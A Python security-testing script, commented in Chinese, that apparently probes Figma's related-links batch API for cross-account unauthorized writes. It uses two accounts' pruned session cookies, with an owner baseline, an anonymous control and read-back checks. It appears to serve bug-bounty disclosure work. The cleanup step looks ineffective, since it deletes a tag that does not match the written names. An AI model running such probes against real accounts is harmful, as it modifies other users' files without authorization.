# -*- coding: utf-8 -*-
"""livegraph mutation 写操作测试 v2: related_links_batch (活跃写路径)
发现: 单文件 POST /api/files/{fk}/related_links 403(疑似废弃端点)
      batch /api/files/related_links_batch A(owner) 200 成功!
核心: 纯净 B 用 batch 写 A 私有文件 -> 若 200 且 GET 可见 = 跨账号越权写

矩阵:
  1. 纯净 A batch -> 基线 (应 200)
  2. 纯净 B batch -> 核心 (若 200 = 越权写!)
  3. 匿名   batch -> 对照 (应 401)
  4. GET 读回验证 + DELETE 清理
"""
import sys, json, io, uuid, urllib.parse, urllib.request, urllib.error
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
HDR = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json", "Origin": BASE, "Referer": BASE + "/"}


def clean_json_cookie_field(raw_value, keep_uid):
    v = urllib.parse.unquote(raw_value)
    try:
        d = json.loads(v)
    except Exception:
        return None
    if not isinstance(d, dict):
        return None
    nd = {k: val for k, val in d.items() if k == keep_uid}
    if not nd:
        return None
    return urllib.parse.quote(json.dumps(nd, separators=(",", ":")))


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    authn_raw = parts.get("__Host-figma.authn", "")
    d = json.loads(urllib.parse.unquote(authn_raw))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        ne = clean_json_cookie_field(parts["__Host-figma.embed"], keep_uid)
        if ne:
            parts["__Host-figma.embed"] = ne
        else:
            del parts["__Host-figma.embed"]
            parts.pop("__Host-figma.embed.mac", None)
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_A = make_abs_pure(rawA, A_UID)
ABS_B = make_abs_pure(rawB, B_UID)
print(f"ABS_A 含A={A_UID in ABS_A} 含B={B_UID in ABS_A}")
print(f"ABS_B 含B={B_UID in ABS_B} 含A={A_UID in ABS_B}")


def req(method, path, cookie, body=None, label=""):
    h = dict(HDR)
    if cookie:
        h["Cookie"] = cookie
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            raw = resp.read().decode(errors="replace")
            print(f"[{label}] {method} {path} -> HTTP {resp.status} {raw[:300]}")
            return resp.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors="replace")
        print(f"[{label}] {method} {path} -> HTTP {e.code} {raw[:300]}")
        return e.code, raw


def get_links(cookie, fk, label):
    st, raw = req("GET", f"/api/files/{fk}/related_links", cookie, label=f"{label}:GET")
    try:
        j = json.loads(raw)
        meta = j.get("meta", j)
        links = meta.get("related_links", [])
        if isinstance(links, list):
            names = [f"{l.get('link_name')}({l.get('node_id')})" for l in links]
            print(f"    ↳ {label} {fk} links: {names}")
            return names
        print(f"    ↳ {label} {fk} raw: {str(links)[:200]}")
        return links
    except Exception:
        return None


def batch_write(cookie, fk, tag, label):
    body = {"link_batch": [{"node_id": "0:1", "file_key": fk,
                            "link_name": f"h1-{tag}-{uuid.uuid4().hex[:6]}",
                            "link_url": "https://example.com/h1-probe"}]}
    st, raw = req("POST", "/api/files/related_links_batch", cookie, body, label)
    return st, body["link_batch"][0]


def batch_del(cookie, fk, tag, label):
    body = {"link_batch": [{"node_id": "0:1", "file_key": fk,
                            "link_name": tag, "link_url": "https://example.com/h1-probe"}]}
    return req("POST", "/api/files/related_links_batch", cookie, body, label)


if __name__ == "__main__":
    print("=" * 70)
    print("步骤 0: GET 基线 (纯净 A 视角)")
    get_links(ABS_A, A_DESIGN, "纯净A")

    print("=" * 70)
    print("步骤 1: 纯净 A batch 写 A design (owner 基线)")
    st1, link1 = batch_write(ABS_A, A_DESIGN, "A", "纯净A-batch")
    if st1 == 200:
        names = get_links(ABS_A, A_DESIGN, "纯净A写入后")
        if names and link1["link_name"] in names:
            print("    ✅ A 写入生效 (owner 基线 OK)")
        else:
            print("    ⚠️ A 返回 200 但 GET 未见 -> 需检查 GET 权限")

    print("=" * 70)
    print("步骤 2: 纯净 B batch 写 A design (核心!)")
    st2, link2 = batch_write(ABS_B, A_DESIGN, "B", "纯净B-batch")
    if st2 == 200:
        print("    ⚠️⚠️ 纯净B batch 返回 200! 跨账号越权写疑似成立")
        namesA = get_links(ABS_A, A_DESIGN, "A视角验证")
        namesB = get_links(ABS_B, A_DESIGN, "B视角验证")
        if namesA and link2["link_name"] in namesA:
            print("    ✅✅ 坐实: B 写入的 link 出现在 A 文件的 related_links 中 -> 文件级越权写!")
        else:
            print("    ⚠️ B 200 但 A GET 未见 -> 可能静默丢弃, 需进一步验证")
    else:
        print("    ✅ 纯净B 被拒, batch 权限门存在")

    print("=" * 70)
    print("步骤 3: 匿名 batch (对照)")
    batch_write("", A_DESIGN, "anon", "匿名-batch")

    print("=" * 70)
    print("步骤 4: 纯净 B batch 写 A make 文件 (第二文件)")
    st4, link4 = batch_write(ABS_B, A_MAKE, "B2", "纯净B-batch-make")
    if st4 == 200:
        names = get_links(ABS_A, A_MAKE, "A视角make")
        print(f"    make 文件 B 写入: 200, A GET={names}")

    print("=" * 70)
    print("清理: 尝试删除写入的 link")
    for tag, cookie, fk in [("h1-A", ABS_A, A_DESIGN)]:
        batch_del(cookie, fk, tag, f"DEL-{tag}")
    get_links(ABS_A, A_DESIGN, "清理后")
